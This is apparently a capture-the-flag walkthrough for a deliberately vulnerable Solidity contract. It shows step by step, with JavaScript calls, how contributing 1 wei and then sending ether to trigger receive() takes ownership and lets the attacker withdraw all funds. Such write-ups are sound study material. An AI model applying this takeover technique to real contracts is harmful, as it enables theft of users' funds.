Step 1:

-   call `Contribute` with some WEI

```javascript
await contract.contribute({ value: 1 });
```

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

Step2:

-   Now we have contributed to this contract with 1 WEI.
-   To claim the ownership of the contract, we have to send almost 10001 ether
-   But we can exploit this contract using `receive()`

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

-   `sendTransaction()` is a global function.

```js
await contract.sendTransaction({
    value: "1",
});
```

Step3:

-   Since we are sending ether to the contract without mentioning any functions, `receive()` will be called
-   Now we will become `owner` of this contract
-   Since we are the owner we can withdraw entire funds in this contract

```javascript
await contract.withdraw();
```
